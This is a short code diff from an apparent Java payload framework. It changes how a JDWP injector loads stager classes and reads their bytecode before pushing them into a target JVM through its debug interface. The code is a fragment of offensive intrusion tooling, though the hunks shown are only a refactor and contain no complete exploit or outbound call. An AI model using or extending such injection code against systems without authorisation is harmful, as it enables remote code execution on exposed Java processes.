@@ -42,6 +42,7 @@ import java.util.List;
 import java.util.Map;
 
 import javapayload.handler.stager.StagerHandler;
+import javapayload.loader.DynLoader;
 
 import com.sun.jdi.ClassType;
 import com.sun.jdi.ThreadReference;
@@ -182,7 +183,7 @@ public class JDWPInjector {
 		}
 		Class[] classes = new Class[] { 
 				javapayload.stager.Stager.class,
-				Class.forName("javapayload.stager." + stager),
+				DynLoader.loadStager(stager, stagerArgs, 0),
 				javapayload.loader.JDWPLoader.class
 		};
 		if (isJDWPTunnelStager) {
@@ -195,7 +196,7 @@ public class JDWPInjector {
 		}
 		final byte[][] classBytes = new byte[classes.length][];
 		for (int i = 0; i < classes.length; i++) {
-			final InputStream in = JDWPInjector.class.getResourceAsStream("/" + classes[i].getName().replace('.', '/') + ".class");
+			final InputStream in = classes[i].getResourceAsStream("/" + classes[i].getName().replace('.', '/') + ".class");
 			final ByteArrayOutputStream out = new ByteArrayOutputStream();
 			final byte[] tmp = new byte[4096];
 			int len;
